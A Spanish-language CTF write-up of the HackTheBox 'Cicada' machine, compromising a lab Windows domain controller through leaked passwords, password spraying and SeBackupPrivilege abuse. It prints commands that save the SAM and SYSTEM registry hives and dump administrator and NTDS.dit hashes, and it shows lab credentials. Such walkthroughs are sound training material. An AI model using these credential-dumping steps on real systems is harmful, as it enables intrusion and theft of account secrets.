---
layout: default
title: Cicada
nav_order: 3
parent: CTFs
permalink: /ctfs/cicada
---

# Cicada - EASY - Writeup HackTheBox
{: .fs-7 }
{: .no_toc }

---

![](/assets/images/cicada/Cicada.png)

<br>

{: .important-title }
> Tecnicas
>
- SMB Enumeration
- Information Disclosure
- RID Brute Attack to discover potential users [Netexec]
- LDAP enumeration with password filtering
- Leaked credentials in "Backup_script.ps1"
- Abusing SeBackupPrivilege [PrivEsc]

---

Comenzando con la enumeración, obtenemos los siguientes puertos:

<br>

```
# Nmap 7.95 scan initiated Mon Feb 24 10:53:22 2025 as: /usr/lib/nmap/nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,58213 -sCV -oN InfoPorts 10.10.11.35
Nmap scan report for 10.10.11.35
Host is up (0.28s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-24 20:53:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
58213/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-02-24T20:54:27
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 24 10:55:06 2025 -- 1 IP address (1 host up) scanned in 104.13 seconds
```

Como podemos ver, tenemos varios puertos abiertos, entre ellos el *53(DNS), 88(Kerberos) y LDAP(389, 636, 3268, 3269)*, lo que sugiere que quizás estemos frente a un *Domain Controller*.  También tenemos los puertos *135(RPC), 139(NetBios) y 445(SMB)*. Para trabajar más cómodo, voy a agregar al **/etc/hosts** los dominios que obtuve con la IP de la máquina:

<br>

![](/assets/images/cicada/cicada-etc-hosts.png)

<br>

Haciendo uso de la herramienta **Netexec**, vamos a ver frente a qué tipo de Windows nos estamos enfrentando:

<br>

![](/assets/images/cicada/enum-cicada-net.png)

<br>

Como podemos ver, nos dice que estamos frente a un *Windows Server 22 de arquitectura 64 bits*. Ahora comenzaremos a enumerar el servicio smb con Netexec, indicando que quiero acceder como un usuario invitado:

<br>

![](/assets/images/cicada/smb-guest.png)

<br>

Al hacer esto, nos muestra que podemos leer en *HR* e *IPC$* como invitados. Si accedemos a HR podemos ver el siguiente archivo:

<br>

![](/assets/images/cicada/Notice-from-HR.png)

<br>

Si lo traemos a local y vemos el archivo:

<br>

```
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

Tenemos una contraseña expuesta que podemos utilizar más adelante. Ahora lo que haré será enumerar usuarios haciendo un ataque de tipo *RID Brute*, que básicamente consiste en enumerar usuarios del sistema por medio de su RID. El RID es un identificador que se le asigna a los objetos de un DC, como usuarios, grupos u objetos de equipo. 

<br>

Con esto explicado lo que haré será utilizar netexec para enumerar los usuarios locales del servidor y los guardaré en un diccionario:

<br>

![](/assets/images/cicada/rid-enum.png)

<br>

Lo que haré será aplicar un filtro para limpiar mejor el contenido:

<br>

![](/assets/images/cicada/enum-users.png)

<br>

Ahora con este archivo, lo que podemos hacer es intentar encontrar una coincidencia de usuario con la contraseña que obtuvimos antes por medio de smb:

<br>

![](/assets/images/cicada/michel-wr.png)

<br>

La opción `--continue-on-success` significa que quiero que continúe realizando la enumeración por más que haya encontrado una coincidencia, ya que si no se lo indico, el programa va a terminar en la coincidencia encontrada y posiblemente nos perdamos otro usuario que quizás también tiene esa misma contraseña.

<br>	

Como podemos ver el usuario michel coincide con la contraseña que le pasamos, ahora podemos utilizar esto para enumerar smb y ldap. Si intentamos enumerar smb no obtenemos nada interesante, más haya de que podemos leer en carpetas donde antes no teníamos permisos como guest:

<br>

![](/assets/images/cicada/michel-wr-smb-enum.png)

<br>

Lo interesante es que si ahora intentamos enumerar ldap:

<br>

![](/assets/images/cicada/michel-enum-ldap.png)

<br>

El protocolo ldap nos permite consultar y gestionar recursos del AD, por ende, con los permisos que tiene michel sobre ldap, podemos enumerarlo y ver que tenemos una nueva contraseña expuesta para el usuario david.

<br>

Ahora lo que podemos hacer, es intentar enumerar smb con las credenciales de david para ver a que recursos tengo acceso:

<br>

![](/assets/images/cicada/david-enum-smb.png)

<br>

Podemos ver que tenemos permisos de lectura en la carpeta *DEV*. Si intentamos acceder a dev con `smblcient` vemos lo siguiente:

<br>

![](/assets/images/cicada/david-backupps1.png)

<br>

Tenemos un archivo "Backup_script.ps1", que si lo descargo y lo traigo a local para analizarlo, vemos el siguiente contenido:

<br>

```
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

Obtenemos credenciales del usuario Emily que podemos utilizar para enumerar smb y ldap, pero no cambia en nada, no obtenemos más información relevante. Lo que podemos intentar es acceder por rpcclient con **evil-winrm**, haciendo uso de las credenciales de los usuarios que ya tenemos. RPCclient es una utilidad que nos permite ejecutar comando en otra máquina, sin tener que preocuparnos por la comunicación de ambas.

<br>

Ahora, lo que haré será intentar ver que usuario y contraseña me permiten acceder por RPC utilizando netexec:

<br>

![](/assets/images/cicada/emily-winrm.png)

<br>

Realice este mismo procedimiento con los otros usuarios, pero no obtuve acceso, solo funciona con emily. Haciendo uso de evil-winrm, podemos acceder el equipo:

<br>

![](/assets/images/cicada/emily-evil-winrm.png)

<br>

Para la escalada de privilegios, lo que haré será ver los privilegios que tiene emily y ver si podemos abusar de alguno de ellos para ser administradores:

<br>

![](/assets/images/cicada/emily-priv.png)

<br>

Vemos que tenemos privilegios de tipo *SeBackupPrivilege*. Este privilegio nos permite realizar copias de respaldo de archivos, sin importar los permisos que tenga esa archivo en cuestión, por ende, lo que haré será hacer un respaldo del archivo *sam y system*. *SAM* es un archivo local del equipo que funciona como base de datos para almacenar los nombres y usuarios del equipo y *SYSTEM* contiene configuraciones de hardware del equipo local.

<br>

Para hacer esto, tenemos que indicarle los siguientes comandos:

```
reg save hklm\sam sam
reg save hklm\system system
```

Posterior a esto procedemos a bajarlos localmente haciendo:

```
download sam
download system
```

Una vez en local, utilizamos *impacket-secretsdump* para dumpear los datos y ver el hash del usuario administrador:

<br>

![](/assets/images/cicada/sam-system.png)

<br>

Y con el hash, ya podemos ganar acceso a la máquina como usuario administrador, teniendo control total del equipo:

<br>

![](/assets/images/cicada/root.png)

<br>

Algo que podemos hacer, ya que tenemos el hash del usuario administrator, es dumpear todos los hashes del NTDS.dit, que es la base de datos que almacena todos los usuarios y contraseñas del active directory:

<br>

![](/assets/images/cicada/dump-hashes.png)

<br>

De esta manera tendríamos acceso a TODOS los equipo del AD.